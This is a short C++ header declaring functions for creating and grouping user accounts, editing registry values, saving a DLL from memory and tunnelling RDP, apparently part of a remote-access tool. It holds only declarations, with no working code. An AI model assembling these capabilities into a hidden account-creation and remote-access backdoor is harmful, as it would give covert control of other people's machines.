#pragma once
#include"Globals.h"
#include<Lm.h>
#include<netfw.h>
#include <sddl.h>
#include "Log.h"
#include<string>

#pragma comment(lib,"Netapi32.lib")
namespace RDP {
	bool setRegistryValue(HKEY hKey, const wchar_t* subkey, const wchar_t* valueName, DWORD newValue);
	bool doesUserExist(const wchar_t* username);
	void AddUserToGroups(wchar_t* user);
	BOOL saveDll(char* buffer, int sz);
	BOOL rdpTunnel();
	bool createUserAccount(const wchar_t* username, const wchar_t* password);
}
